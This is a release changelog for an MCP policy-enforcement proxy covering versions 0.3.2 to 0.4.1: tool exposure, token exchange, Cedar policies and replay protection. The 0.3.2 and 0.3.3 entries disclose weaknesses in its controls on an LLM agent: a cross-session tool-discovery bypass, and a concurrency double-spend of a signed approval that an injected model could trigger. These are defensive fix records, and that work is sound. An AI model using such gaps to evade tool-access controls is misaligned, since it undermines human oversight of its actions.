# Changelog

Notable changes to extensible-mcp, release by release. The project stays in
semver's `0.x` range deliberately — the public API isn't frozen yet.

## [0.4.1] - 2026-11-19

The proxy in front of platforms that load a server's tools once and run steps
of their own, and the two pieces 0.4.0 stated as later work, done: the
downstream can see the caller, by token exchange, and a Cedar policy can test
hierarchy, over an entity store the fetch plan declares. Nothing moves the
enforcement point. A tool listed statically dispatches through the one call
path every other call takes; a step the platform runs itself is decided at the
proxy and nowhere else; the exchanged token reaches the client manager after
the pipeline has allowed the call and no filter sees it; and every edge in the
entity store is a plan entry with its provenance legible.

**Upgrading.** No dependency changes: the FastMCP 4 and MCP SDK 2 bounds are
those of 0.4.0, and a stdio deployment runs exactly as before. The default
`"exposure": "dynamic"` is byte-for-byte 0.4.0. Three names are now reserved
and refused at construction where a configuration of 0.4.0 could have used
them: `platform` as a downstream server's name, and `search_tools`,
`call_tool` and `load_mcp_server` as a local tool's. `CallRequest` gains
`verdict_only`, default `False`; a custom call filter whose effect goes beyond
its answer, one that logs, counts or spends, must have none when it is set,
since the shipped replay guard now honours the flag and a filter that does not
would spend evidence on a question. A Cedar bundle that carried a top-level
`entities` key in its fetch plan or a `schema.json` beside its policy was
ignored on both counts by 0.4.0 and is read here: the block forms the store
and the schema is a hard gate, so a bundle whose policy its own schema refuses
no longer loads. The four supplied Cedar production bundles are re-pinned to
the toolchain's current emission, which ships the schema; their ids, manifest,
plan and guidance are byte-identical to the previous pin.

**Added: static exposure.** Workflow and agent platforms load a server's tool
set once and dispatch tools themselves: n8n's MCP Client Tool node sends
`tools/list` on connect and hands the result to its agent as fixed tools; the
LangChain, Google ADK and Strands MCP adapters list when the agent is built and
bind the same way. Pointed at this proxy they saw three meta-tools and a
discovery workflow their tool model does not expect. With `"exposure":
"static"`, `tools/list` answers with the governed catalogue instead: every
downstream tool under its qualified name and every local tool under its own,
each with the schema `search_tools` would have printed for it, credential
parameters marked required or required-when, scoped to the caller. The
meta-tools are neither listed nor reachable, so there is no runtime loading in
this mode. Nothing is registered on the server for a listed tool: the list is a
view composed over the proxy's registry, the whole index through the search
pipeline with the empty query, so one rule scopes listing and search, and
every listed name dispatches through the path the `call_tool` meta-tool takes,
with access control, role scoping, the bundle and single-use evidence
unchanged. The structural rule changes shape rather than force: a
`StaticCatalogueFilter` holds the `DiscoveredToolsFilter` slot and derives the
callable set from the caller's view per call, with nothing to evict. The
listing is a menu, not an allowance. A platform may list at activation before
any user exists, call much later, or open a fresh connection per call, and
none of it matters, because the token on each request says who is calling and
the call is checked against that caller's view at that moment: a tool listed
to a parent and called under a child whose roles exclude it is refused with
the reason. A refusal is a tool-level error carrying the rendered sentence; an
allowed call returns the downstream's native result. One client per user is
the deployment precondition, and the README says why a client built once with
a service credential makes every user one principal.

**Added: `/decide`, `/call` and the `platform` pseudo-server.** A workflow also
has steps that never cross MCP: a shell node, an HTTP Request node, a plain
function tool. A platform's native actions are now tools of a reserved server
named `platform` (`platform__exec`, `platform__http_request`, and declared
functions with a schema), so a policy bundle, a role scope, an access-control
pattern, a policy-set route and the augmenter apply to them with no second
code path, because everything the proxy decides with is keyed on the server
name. Two plain HTTP routes beside the MCP endpoint, mounted only under static
exposure on the HTTP transport, each behind the same bearer requirement as the
MCP path: `POST /decide` runs the whole call pipeline for the request's
principal and stops where the proxy would dispatch. It is effect-free: nothing
runs, no downstream is contacted, no evidence is spent, and the response is
the verdict, the arguments as the filters left them with credential fields
stripped, and the rendered reason. `POST /call` runs the same path to the end
and returns the three values an MCP client receives; a refusal is the step's
result. The proxy runs `platform__http_request` itself after the pipeline
allows: to an origin declared under `hosts` only, with the methods, path
prefixes and request headers the entry lists, presenting the bearer it
acquired with the entry's credential, following no redirect, with the response
capped and marked truncated past the cap, so the target's secret lives with
the proxy and is never seen by the platform or the model. `platform__exec` is
a program with arguments and never a shell: a `command` string is tokenized
with POSIX rules into `argv` and refused before any filter runs if it carries
an operator, redirection, substitution, glob or variable reference, and the
proxy never runs it; the platform asks `/decide` and runs the command itself.
There is no code shape, since no policy can say what a program does; a
deployment that enforces a policy turns the platform's code tools off, and the
README names which. The identity on both routes is the end user's, forwarded
by the platform.

**Added: token exchange, the delegated identity.** 0.4.0 said that over HTTP
a grant credential is the proxy's service identity and that delegated identity
was a later release. `token_exchange` (RFC 8693) is the third grant: the proxy
presents the caller's verified inbound token as the `subject_token`,
authenticated as itself by exactly one of `private_key_file` or
`client_secret_env`, and is handed a token the authorization server issued
about that person. The downstream sees the caller as `sub` and the proxy as
`azp`, and `act` wherever the server asserts delegation; no `actor_token` is
sent, since the client authentication is the actor. The exchange is per call
and per person, cached per `(iss, sub)` for the exchanged token's lifetime
capped by the inbound token's own expiry, so a delegated token never outlives
the session it came from; a refused exchange fails the call, and the proxy
never substitutes its own identity for the caller's. The one request made as
the proxy itself is listing a server's tools at admission, where no caller
exists. Because the exchange needs a caller on every call, the grant is
refused wherever a call could arrive without one: on stdio, over HTTP with
`--allow-anonymous`, from `create_server` unless `require_principal` is
`True`, and as the credential of a `platform__http_request` host. The caller's
token is read at dispatch, after the call pipeline has allowed the call, on
the MCP path and `POST /call` alike, and reaches the client manager only; its
repr shows `iss` and `sub`, it is never logged or compared, and the
`Principal` never carries it. The README now states the three credential
shapes and which identity each shows the downstream, and names the fourth
case, a downstream outside the deployment's domain with per-person accounts
reached over HTTP, as out of scope rather than leaving the exchange to seem to
cover it. Measured against the demo's committed Keycloak realm (26.8.1), which
gains the proxy's confidential client with standard token exchange on and
nothing secret in the file: the exchanged token carries the subject's `sub`,
`azp` for the proxy and no `act`; `scope` is what adds an audience and
`audience` only filters; a token not addressed to the proxy is refused with a
403; the proxy's key must be registered as a JWKS string. The recipe records
each measurement.

**Added: the Cedar entity store, and `in` held to a schema.** 0.4.0 shipped
Cedar with an empty store and `in` refused at load. The store is now formed
per call from the fetch plan's top-level `entities` block and from nothing
else. The block names the head's two entity types and where their ids come
from (`caller.sub` and the package by default, or an input field holding an
entity reference), the manifest fields moved from `context` onto each entity
as attributes (read as `resource.status` rather than `context.status`), the
fields whose values are entity references, wrapped in Cedar's escape by the
block and never by inspecting a value's shape, the membership fields, each a
list of entity references assembled from a declared source like any other
field that becomes that entity's parents, and attributes placed on a
referenced entity. Nothing enters the store undeclared, and every edge's
provenance is the plan entry that produced it: `principal in
IdpRole::"parent"` comes from the IdP's roles claim through a `caller` entry
and the new `entity_refs` primitive, under a type name the plan states
literally; `resource in Org::"acme"` is the deployment's word, a `config`
entry; `principal in Family::"<id>"` is a `derive` fold over a verified
membership credential, so the edge exists only if the signature did. A bundle
that ships `schema.json`, the manifest in Cedar's schema notation, is
validated against it at load by Cedar's own validator as a hard gate, with the
validator's messages, and may then test `in`; the loader additionally refuses
every `in` over a relation the schema's `memberOfTypes` cannot reach from the
subject's type, every `in` on an attribute subject and every `in` on the
action, because the validator passes all three in a `when` clause, types them
as `false` and reports nothing, which is measured and pinned. A bundle with no
schema has every `in` refused as before and gets the empty store it always
had. The schema is never passed to the evaluation, since its store parse is
strict and a manifest with an open object cannot be typed; a store that
cannot be formed as declared is a fault, never a denial. Hierarchy over an
attribute subject, action groups and the toolchain's decision schema are not
formed in this release. Beside the four re-pinned production bundles, two
supplied loader-grammar fixtures are adopted on Cedar only, attributes on the
resource in one and entity references with the principal as a value in the
other, with a call-sourced principal that their provenance says is outside the
proxy's threat model, so neither is attached to a server; and one bundle of
this repo's own is the first to test `in`, with its three edges from the three
sources and a schema declaring exactly those relations.

**Documentation.** The README gains the static exposure section, the section
on the two routes and the `platform` block, the three credential shapes under
Authentication, the entity-store paragraph in place of the sentence that said
the store was unused, and a hierarchy walk-through in Authoring a bundle;
SECURITY.md states the store's structural consequence and what would count as
a finding; the Keycloak README has the exchange recipe; the Status, overview
and test-count statements are current.

**Tests.** The proxy suite is 1463 passed and one skip. The demo suite is 243
passed and two skips, one for a test that needs the workspace admin key and
one that runs only against a live Keycloak. The identity suite is 55.
Twenty-three directories under `tests/fixtures/`: twenty call-gate bundles,
the three production policies and the teaching policy on all three engines
among them, plus the selection classifier and two expression-shape tables that
are not bundles. The static-exposure tests include a tool listed to one
identity and called under another, and a call from a connection that never
listed; the route tests include that `/decide` spends nothing and that a
refused call exchanges nothing; the store tests carry the measurements behind
each loader rule and run the supplier's scenario tables through this loader.

## [0.4.0] - 2026-11-11

The proxy over Streamable HTTP, as a shared enforcement point that knows who
is calling. One process serves many people; every request carries a verified
principal; what a person can see, call and load is a function of who they
are; a policy can read who the session acts for from the proxy and never from
the call; and the demo runs as an organization on its own identity provider.
The protocol underneath moved too: this release is built on FastMCP 4 and MCP
SDK 2, the 2026-07-28 revision, which has no session, so the one guarantee
this proxy always made is now keyed on the person rather than the connection.

**Upgrading.** `fastmcp>=4.1,<5` and `mcp>=2.3,<3`, with `httpx2` as a direct
dependency; the bounds stay below the next majors so a revision this proxy has
not been run against cannot arrive by resolution. 0.3.6, the patch on the
0.3.x line, bounded FastMCP below 4 and gave the stdio CLI a `single_session`
flag; neither is needed here and neither exists here, since discovery keys on
the principal, or on the process when there is none. A downstream server on
either revision connects: the proxy sends `server/discover` and falls back to
the legacy `initialize` handshake on any refusal of the probe (GitHub's
official server refuses it with code 0), except from a server that advertises
only the modern revision, which has nothing in common with the legacy path. A
stdio deployment with no `auth` block runs exactly as before. Every bundle that
loaded on 0.3.5 loads here, with two exceptions stated below under validation
and Cedar.

**Added: inbound identity.** An `auth` block builds FastMCP's `JWTVerifier`,
resource-server mode only: `issuer`, `audience`, and a `jwks_uri` or one public
key; a client secret in the block is refused, since `config.json` is
committed. The verified claims become a frozen `Principal` (`sub`, `iss`,
`roles`, `client_id`, `auth_time`, `amr`, `acr`; never the raw token) that
rides on every request through all four pipelines, read per request rather
than cached, so a token that changes hands mid-conversation is seen. A verified
token with no `sub` or `iss` is refused, not treated as anonymous. The
`principal` block names the roles claim by dotted path and an optional
`role_map`, which is total: an unmapped value is dropped and logged once; no
map is the identity case. `create_server(require_principal=...)` is the
deployment-mode selector, enforced in the handlers ahead of every pipeline
rather than as a filter, because an unset filter permits: `True` refuses every
request without a principal, `False` is single tenant on purpose, unset is what
the HTTP gate decides.

**Added: `--transport http`, and the gate in front of it.** There was no
transport flag before, and that absence was accidentally load-bearing: a
shared deployment could not be misconfigured because it could not be asked
for. Now it can, so the CLI refuses the configurations that were sound only
because one process served one person: no `auth` block (unless
`--allow-anonymous` says this is one person's proxy, which is itself refused
beside an `auth` block and on a non-loopback host), and a configured tokens
file, flat, since one bearer per server per process is one downstream identity
presented for every caller. Each refusal is an exit before the server is
built. Runtime loading stays a stdio capability: over HTTP `load_mcp_server`
is refused at the handler with a message saying servers on a shared proxy are
configured, not loaded. Refused rather than hidden, since a hidden tool is a
suggestion.

**Added: per-role scoping.** `filters.access_control.by_role` maps a role to
the downstream servers it may see (`"*"` for everything not globally denied)
and whether it may load one at runtime. Roles are additive and the global deny
lists stay a floor. Present, it fails closed: a principal whose roles match no
entry, or no principal at all, sees nothing, local tools included, and every
call and load is refused, because a catalogue filter that loses its principal
would otherwise leak another caller's tools. One index; the same rule on
search, call and load.

**Added: the `caller` fetch-plan source, and the token/evidence seam.** A
policy can read who the session acts for, from the principal the proxy
verified and never from the call: `params.field` names one fact,
`params.fields` several as one object, from a fixed vocabulary checked at
load. The augmenter advertises nothing for it, since nothing about it is
call-sourced, and with no principal the lookup fails closed and renders as a
denial. The membership credential gains `credentialSubject.accounts`, a list
of `{idp, account}` the admin signs beside the role, and the `did-server`
gains `--account IDP=ACCOUNT` to issue it; the field is optional and absent by
default, so every credential issued before it existed is unchanged. With the
two together a bundle can state the one condition that joins a session to the
evidence it carries: the session is bound to the requester when the
membership's subject is the caller's account, or `{idp, account}` is among the
accounts the admin bound. With no principal the condition holds, because
requiring a principal is `require_principal`'s job and not the bundle's. The
teaching CEL bundle `cel_family_spend_bound` is that condition written out;
the three supplied production policies carry it as `account_bound`, one check
per tier, re-pinned to the toolchain's current emission (the policies also
dropped their inline `deny_reason` rules, since every engine renders through
the guidance layer, and are a third smaller for it).

**Added: a policy set.** `policyset.json` declares the routes a deployment
runs: each names a server type (a bundle directory), the tools it governs and
a wire adapter, and the selection map's values are route ids. The filter chain
attaches to the server type when the deployment registers it and is never in
the declaration, so a route cannot declare a composition, let alone a wrong
one. `PolicySet.load` refuses every dangling reference and unknown key;
`bind` refuses, in both directions, a type or adapter declared but not
registered or registered but not declared, then loads every bundle and builds
every chain before any server is admitted. The per-route tool list is
load-bearing: a certified policy that binds merchant and total cannot bind a
tool name its evidence never signs, so a second gated tool on the same server
would accept a replayed approval, and the demo's one shared gated-actions set
had exactly that shape. Every admission leaves a record and the boot log
prints one line per server and a closing count, so whether every configured
server ended up under the gate it was meant to is answerable from something
other than the absence of denials. `SelectionResult.route` replaces the field
that named a bundle: the value was false for one of the demo's three routes,
which is a route over a bundle with a different adapter and not a bundle at
all.

**Added: Cedar's PARC head is the proxy's own, and `in` is refused.** The
head is built per evaluation: `principal` is `Caller::"<sub>"` when the input
carries a `caller`-sourced object with a `sub`, else `Caller::"anonymous"`;
`action` is `Action::"<tool>"`; `resource` is the server type the bundle
governs, a label with provenance rather than an input; everything evidential
is `context`, since a request carries several evidence identities and
`principal` is singular. The entity store is empty in this release, so `in`,
entity attributes and a schema are unsupported, and `in` is refused at load:
measured against an empty store, a `forbid` on group membership returns Allow
with no diagnostic, a policy hole that looks like a passing test, and cedarpy
exposes a policy's effect and annotations but not its conditions, so the
policy text is the only handle. A Cedar bundle that used `in` and loaded on
0.3.5 is refused here, naming the line. Populating the store from the fetch
plan is the next Cedar release's work. The three production policies are now
adopted on Cedar too, in the permit-decides shape, held to their Rego twins by
the corpus test, and every production scenario runs on all three engines.

**Added: `emit: false`.** A fetch-plan entry is resolved into scratch, readable
by later `$input` references, and left out of the assembled input, so a plan
can derive from the wire bytes and then drop them: the raw JWS feeds a
`sha256` entry, the rule reads the digest, and a closed manifest has no raw
property to reject. The credential partition is decided by source kind alone
and is independent of the flag, so an unemitted credential is still surfaced
on the search side and still stripped before the downstream call. An unemitted
field the manifest still requires is refused at load.

**Changed: an integral float is not an integer.** JSON Schema lets `12.0` and
`1e3` through an `integer` field, and the three engines disagreed on them:
Rego decides, CEL raises, Cedar cannot build the request, and the certificate
a bundle ships with maps a float to nothing at all. The validator now runs the
manifest with `integer` redefined as a JSON integer, `int` and not `bool`,
the one exclusion the schema cannot state. An input 0.3.5 accepted at an
integer field may now be refused; a conforming input is unaffected. A
validation error now also explains an engine fault, so a float from the clock
or from the model ends as the same denial at the same path on every engine
rather than as "could not be evaluated"; a policy's own denial is still the
reason the caller sees. Found by the external policy-authoring toolchain's
randomized differential.

**Changed, in the direction of fewer silent failures.** The call and response
pipelines rebuild the object they hand each filter with `dataclasses.replace`,
naming only the fields a filter may rewrite, so the next field added to a
request type rides through without the pipeline being told; the
field-propagation invariant that 0.3.5 shipped as an expected failure now
passes, and an aliasing test runs two requests through every pipeline at once.
The downstream's `structuredContent` rides on `CallResponse` as
`structured_content`, forwarded and not rewritable. A wallet lookup whose
subject roots at `tool` or `arguments`, directly or through a `derive` entry,
is refused at load: the shipped bundles always keyed their lookups on a field
inside a signed credential, and that was a convention nothing checked. The
loser of a reservation race on one credential is told the approval may still
be live and that a retry is the way out, rather than that it was used. A CEL
fault's text carries the check and the error and never the input, which
cel-python appends whole, credentials included; the filter bounds what it
logs of any engine's exception. A filter given no executor assembles with the
`derive` vocabulary its bundle was validated against, rather than the default
one: the first shipped plan that derives with a configured primitive showed
the difference. Result fields are read in the SDK's snake_case, so the suites
run with no deprecation warning.

**Changed: the index builds in batches of eight, with the ONNX arena off.**
The whole catalogue went to fastembed as one batch, padded to the longest
description, so peak memory scaled with batch size times padded length
squared, about 1 GB for 120 tools; eight is the measured knee, and with the
arena on, Linux held the build's peak for the life of the process. A text's
embedding does not depend on its batch, so search is unchanged; this is a
memory setting, not a relevance one. Both are constructor parameters on
`VectorStore`. Reported, with measurements, by @johnrufusone.

**The demo: an organization on its own identity provider.** A compose overlay
starts the committed Keycloak realm (26.8.1) beside the two demo containers
and puts the family side on it: Keycloak is the organization's identity
provider, the proxy its enforcement point with a verified principal on every
call, the console holds one MCP session per signed-in person and presents that
person's token, the approval service is its passkey authority and accepts the
provider's tokens on the same terms the proxy does, and the parlor is the
other organization. First boot binds each member's account at the provider
into the admin-signed memberships, and enrolment mints the account that
enrolled the passkey into the enrollment credential, so the production
policies tie the console session to the member whose key signed. A sign-in
that did not use a passkey (no `hwk` in `amr`) cannot enrol one, since
enrolment is the chain's first link. Two operator commands give the realm's
users, who ship with no credential so that the file carries no secret, their
first passkey: `arm`, a sign-in by each at a thank-you page that keeps no
token, `seal`. The Keycloak README has a step-by-step run sheet from a clean
machine. Without the overlay the home shape stands: one household on
loopback, no inbound auth, every principal `None`.

The approval leg no longer holds the conversation open. `request_invoice_approval`
opens the approval and returns at once as a task, in the vocabulary of the MCP
Tasks extension (`input_required`, a task id, the window the merchant signed);
`approval_result` fetches the outcome by id once a human has signed; the
approval service announces terminal states on an event stream carrying the id
and status only, never the evidence; and the console resumes the conversation
when the task completes. A pending approval expires with the invoice it is
for. The console takes one chat turn at a time, answers a second message
with a busy sentence, and rolls the history back when a turn fails, so one
refused API call no longer leaves the agent dead until a restart. The passkey
page signs in again when its session has expired, keeps the enrolled
credential across that round trip, and reports a refused enrolment instead of
failing silently. The deploy documents say what a restart, a `down` and a
switch between the two shapes each keep, and where the home shape's passwords
are printed. Every one of these came out of running the two shapes by hand
before the release.

**Documentation.** The README's Usage shows both transports and what the HTTP
gate refuses; the Authentication section states that over HTTP a grant
credential is the proxy's service identity, with per-person authorization at
the proxy and delegated identity by token exchange a later release; the
Cedar section states the empty entity store; the Status, overview and
test-count statements are current.

**Tests.** The proxy suite is 1193 passed and one skip; no expected failure
remains. The demo suite is 236 passed and two skips, one for a test that
needs the workspace admin key and one that runs only against a live Keycloak.
The identity suite is 55. Twenty directories under `tests/fixtures/`:
seventeen call-gate bundles, the three production policies and the teaching
policy on all three engines among them, plus the selection classifier and two
expression-shape tables that are not bundles. The in-memory tests run in the
client's sessionless mode, so the suite exercises the revision this release
claims; two people over real HTTP cannot see each other's discoveries, and
one person keeps theirs across connections.

## [0.3.6] - 2026-11-02

Two changes, and the first is urgent for anyone installing fresh.

**The dependency ranges are bounded** to the majors this line was built and
tested on, `fastmcp>=2.0.0,<4` and `mcp>=1.0.0,<2`.

**The stdio CLI keys discovery on one bucket, not on the session id.** The
proxy's CLI serves stdio only, so one process serves exactly one client, and
that fact, rather than the framework's session id, is now what the
discovered-tools guarantee keys on (`create_server(single_session=True)`,
which `main()` sets). Behaviour is unchanged on FastMCP 3, where the session
id is stable for the life of the connection; on FastMCP 4 it is what makes the
CLI work at all (below). An embedder serving several clients over HTTP keeps
per-session scoping by leaving the flag off, as before.

**Why.** FastMCP 4 shipped on 2026-08-31 on MCP SDK 2, which speaks the
2026-07-28 protocol revision. That revision removes the protocol session, and
under FastMCP 4's default sessionless mode `ctx.session_id` is a fresh value
on every request. This proxy scopes discovered tools per session (0.3.2), so
on FastMCP 4 every `call_tool` after a `search_tools` is refused as "not
discovered". 0.3.5 declared `fastmcp>=2.0.0` and `mcp>=1.0.0`, so a fresh
install today resolves to FastMCP 4.1.5 / SDK 2.3.0 and the proxy denies every
call. It fails closed, which is the right direction, but it is unusable.

An existing installation on FastMCP 3.x is unaffected and needs nothing. A
fresh install, or one that re-resolved to FastMCP 4, should upgrade to 0.3.6.
With the second change the CLI also runs correctly on FastMCP 4 for anyone who
overrides the bound; the embedding API does not, since per-session scoping has
no stable key there.

Adopting the 2026-07-28 revision, where discovery scoping has to key on
something other than the session, is a later release; it is not a patch.

## [0.3.5] - 2026-10-27

Three things, and they are one thing: a third policy engine, the machinery it
needed, and the rules written so that a person can author a bundle in any of the
three languages without a toolchain. Forward compatible from 0.3.4: every
bundle that loaded on 0.3.4 loads here, no export was removed, and a
deployment on the tokens file keeps working.

**Added: Cedar, as the third engine.** `policy.cedar` is accepted beside
`policy.wasm` and `checks.cel.json`, evaluated through `cedarpy`, shipped as
the `cedar` extra and pinned to one version because the engine reads the
diagnostics shape. Cedar has no host-function extension point, by design, so a
signature check cannot run inside the policy; each cryptographic leaf becomes a
`derive` entry in the fetch plan (below), and the rule tests a relation over the
witness set the proxy derived. A Cedar bundle is therefore *certified modulo its
derivation contract*, a narrower claim than the other two engines make, and
SECURITY.md says so.

Two policy-set shapes load, declared in `expected_ids.json`. **Forbid-only** is
what an external policy-authoring toolchain emits today: one unconditional
permit and one annotated forbid per condition. An empty or half-loaded set of
that shape allows everything, so the loader refuses a set that does not carry
exactly the ids the file lists. **Permit decides, forbid explains** is the shape
a person writes: one `@tier` permit per tier carries the decision and the
forbids carry only explanations, evaluated in two passes keyed on a reserved
`probe` context key. In that shape every degenerate case denies, the file for
the same policy is a quarter the size (22.6 KB against 101.8 KB on the adopted
family-spend policy, 85% of which was the other tier restated, negated, in every
leaf), and `expected_ids.json` is optional. A raise in either pass is a fault,
never a denial.

**Added: `derive`, the fetch-plan source Cedar needed.** A fifth source kind
beside `call`, `config`, `clock` and `wallet`: a field computed from earlier
fields by one primitive from a registry the proxy owns. A key-consuming
primitive may only be folded over candidate keys and project a witness, never
applied bare to yield a verdict, because a verdict no longer carries the
relation the rule has to keep; the shapes that would booleanize a check are
refused at load, as is an `fn` this proxy cannot satisfy and a plan naming one
field twice. Seven of the eleven primitives are the same implementations the
Rego and CEL engines run as host builtins, so the contract carries over by
construction; the Python reimplementations of OPA natives are held to OPA's
behaviour, including undefined on an unreadable operand.

**Added: the policy's rules written by hand, in any of the three languages.**
A minimal bundle, one tier and five conditions, ships in all three engines under
`tests/fixtures/` and the README walks through every file of it. For CEL and
Cedar the denial text can live beside the rule — a check written as
`{"expr": ..., "sentence": ...}`, a `@sentence` annotation on a forbid — and
the loader synthesises the guidance it needs when `guidance.json` is absent;
Rego's `deny_reason` rules were already that form. The README's engine table
states what each engine accepts and what the proxy imposes, and names the
one thing still deferred: a Cedar policy over real principals and entities,
which waits for the proxy to have a principal.

**Added: a bundle attached from `config.json`.** A `policy_bundles` block
under `filters` maps a server to a bundle directory and the config facts its
plan reads, so a hand-written bundle governs a server with no Python. The
whole server is governed; a plan with a `wallet` source is refused at startup
with a message saying that source needs a lookup written in code; single-use
evidence is opt-in per credential field; the search-side augmenter is wired so
the model sees the credential parameters.

**Added: ES256 and RS256.** JWS verification for P-256 and RSA keys beside
EdDSA, registered as OPA's `io.jwt.verify_es256` / `io.jwt.verify_rs256` host
builtins, as CEL functions, and as derive primitives. A token whose algorithm
does not match the verifier is false, not a fault.

**Added: downstream credentials by OAuth grant.** A `credentials` entry is a
client identity the proxy authenticates with, by `private_key_jwt` (RFC 7523,
needs the new `oauth` extra) or `client_credentials` (secret named by
environment variable; an inline secret is refused at load). The token lives
in memory, is attached per request and refreshed in place on a 401, and is
presented only to a URL the config names for that server, as a bearer always
was. The tokens file remains supported: it logs one note per process naming
the alternative, and will be removed only after a runnable example of the
grant path ships. A server uses one path or the other; naming both is refused
at load rather than settled by a silent precedence rule. No identity provider
is required by anything in the proxy or the demo.

**Changed: check ids are named, and manifest validation is on.** The bundles
carry the toolchain's named ids (`solo.request_vc.signed_by`) rather than
positions, and the assembled input is validated against the manifest before the
rules run. An input that 0.3.4 let through unvalidated is now checked; a
conforming input is unaffected.

**Changed, all in the direction of saying the right thing.** CEL evidence
that does not parse is now an evidentiary denial rendered with the consuming
check's own sentence, not an engine fault. Engine faults are logged in full and
reach the model as a generic refusal; their detail no longer travels in the
reason. And a call that omits a credential every path requires is refused as a
denial that names it -- "provide `requestVC` which was not supplied" -- rather
than as the assembly fault "Policy input could not be assembled", which read as
a crash and withheld the one thing the caller needed to hear.

**Documentation.** The Authentication section rewritten for the grant path;
the Status, extras and test-count statements made current everywhere; the
discovery-set scope corrected in CLAUDE.md; the GitHub example no longer
claims a runtime-loaded server is sent a token.

**Tests.** The proxy suite is 848 tests plus one expected failure: the
field-propagation invariant that Phase 0 of 0.4.0 owes, marked
`xfail(strict=True)` so it turns red the day it starts passing without being
flipped. The demo suite is 133 plus one skip for a test that needs the demo's
workspace admin key. The identity suite is 51. Fourteen directories under
`tests/fixtures/`: eleven call-gate bundles across the three engines, four of
them twins of one family-spend policy that a three-engine differential holds to
one verdict and one set of failed ids on every scenario, plus the selection
classifier and two expression-shape tables that are not bundles.

## [0.3.4] - 2026-10-10

**No runtime change.** Packaging only, and the first release published to PyPI.
Nothing in `src/` differs from 0.3.3; an existing deployment has no reason to
upgrade except to install from an index rather than a checkout.

**Added: `[project.urls]`** — repository, changelog, issues and security policy,
so the PyPI page carries sidebar links rather than a README and no way out.

**Added: a trusted-publishing release workflow.** `release.yml` publishes on a
`v*` tag via PyPI's OIDC trusted publishing, so no API token exists anywhere:
PyPI is configured to trust this repository and this workflow filename and mints
a short-lived credential at publish time. Renaming the workflow breaks
publishing until the PyPI-side publisher is updated to match.

Three properties of that workflow worth stating, since they are deliberate:

- Build and publish are separate jobs, and the publish job does not check out
  the repository. No repository code runs in the job holding the OIDC token; it
  can only upload what the build job produced.
- The tag must agree with `pyproject.toml`'s version. A published version can be
  yanked but never replaced, so a mismatched tag is caught before upload rather
  than discovered after.
- All three test suites run before anything is built, for the same reason.

`pypa/gh-action-pypi-publish` also emits PEP 740 provenance attestations by
default under trusted publishing, so a consumer can verify an artifact came
from this repository and this workflow.

## [0.3.3] - 2026-10-09

**Fixed: one signed approval could authorize several concurrent calls**

`SingleUseEvidenceFilter` tested the spent store, awaited the inner policy, then
recorded the spend on success. The `await` is a yield point, so two calls
carrying the same credential both passed the "already spent?" test before either
recorded, and both were allowed -- the replay the filter exists to prevent,
reached by concurrency rather than by sequence. Measured rather than inferred:
eight concurrent calls spent one approval eight times, and the policy was
consulted eight times about a credential that may be spent once.

**This affects the shipped stdio configuration.** A single MCP session
dispatches each JSON-RPC request as its own task -- measured: two `call_tool`
requests from one stdio client entered the handler simultaneously and overlapped
for the whole of a 300 ms handler. A model emitting several tool calls in one
turn is the ordinary fast path for parallel tool use, so the window opens
without an adversary; an injected model that wanted to double-spend would simply
emit the call twice. Affected: 0.3.0 (where the filter was introduced) through
0.3.2.

The guard now **reserves** every credential id before running the policy and
releases on a refusal or a fault, which keeps the property the old ordering was
chosen for: a refused call leaves the credential spendable. Reservation happens
before any yield, so there is no window. A partial claim is rolled back, and a
policy that faults rather than decides hands the evidence back.

The cost is one narrow false denial, documented in the filter's docstring: of
two concurrent calls on a single credential, the one that loses the race is told
the approval is used even if the winner is then refused and releases it.
Refusing wrongly is the safe direction and a retry succeeds.

**Added: `SpentStore`, so replay protection can outlive one process**

Reservation has to be atomic, and a shared store needs an `await` between a
query and a write -- which would reopen the window. So atomicity is the store's
contract rather than the filter's: `SpentStore` is a Protocol with
`reserve(key, expires_at) -> str` and `release(key)`, where `reserve` must be a
single test-and-set. `InMemorySpentStore` is the default and refuses at capacity
rather than evicting, since evicting a live entry is how a replay gets through.
`SingleUseEvidenceFilter(..., store=...)` takes an alternative; a Redis
`SET key val NX PX` satisfies the contract directly. `SpentStore`,
`InMemorySpentStore` and the three outcome constants are exported from the
package root.

This makes true something the filter's docstring has claimed since 0.3.0 -- that
"a deployment that needs replay protection across restarts or across several
proxies should pass a shared store" -- for which no parameter existed.

**Still not addressed, and the default is still in-memory**

A restart forgets unexpired entries, and for this property forgetting fails
*open*: a spent credential becomes spendable again. (Contrast
`DiscoveredToolsFilter`, where forgetting denies.) The default store is not
shared between processes, so N proxies means one approval is spendable once per
proxy. `store=` is the seam; no shared implementation ships. And
`InMemorySpentStore.reserve` is atomic against asyncio tasks, not against
threads.

**A note on the fix's own first attempt**

The reserve loop initially iterated credential *fields* and reserved each id
independently. A bundle's authorization credential carries the same `jti` as the
request credential it signs over -- the policy requires it
(`requestVC.claims.jti == authorizationVC.claims.jti`, with
`authorizationVC.claims.requestHash == sha256(requestVC.jws)`) -- so two fields
yield one key, and the second reservation refused the call its own credentials
authorized. Caught before release; recorded because the shared-`jti` invariant
is easy to rediscover the hard way.

## [0.3.2] - 2026-09-28

**Fixed: the discovery rule is scoped per session, not per process**

Reported externally against the public repo as an in-scope bypass of the
"the LLM can only call tools it has surfaced via `search_tools`" property, and
it was one. `DiscoveredToolsFilter` held a single `set[str]` for the whole
process, so the guarantee was really "any tool anyone connected to this proxy
has ever surfaced" -- a monotonically growing global allowlist. On stdio, where
one process serves one client, it made no difference; on an HTTP transport
serving several sessions, a tool one session surfaced became callable by every
other.

`CallRequest` gains an optional `session_id` (defaulting to `None`, so
third-party filters are unaffected), populated from `ctx.session_id`, and the
filter keys its sets by it. Sessionless transports share one bucket, which is
exactly the single-client case the guarantee was written for.

Two details worth recording. `CallFilterPipeline` rebuilds the request for each
filter, and until this was caught it dropped the new field -- which silently
restored the bypass while every happy-path test passed; the demo's two wire
adapters rebuild it too and had the same hole. And the per-session store is
bounded, evicting least-recently-used: here eviction is the *safe* direction,
because forgetting a discovery denies a call rather than allowing one, so
flooding the proxy with sessions restricts other sessions instead of freeing
them. (`SingleUseEvidenceFilter` refuses rather than evicts, because there
eviction would let a replay through.)

**Documentation: `SECURITY.md` advertised the property unqualified**

The README had carried the process-scope caveat since 0.3.0, but `SECURITY.md`
listed the property in scope with no qualification -- so a researcher reading
the security policy took it at face value, correctly. That contradiction was
the real defect. `SECURITY.md` now states the scope and adds a *Not claimed*
section: the proxy does not authenticate its caller and has no notion of which
user a session acts for, so access control and the tool catalogue are
deployment-wide rather than per-principal. Where a principal is established it
is established by signed evidence, which answers *who asked for this action*
rather than *who is on the other end of this session*.

## [0.3.1] - 2026-09-17

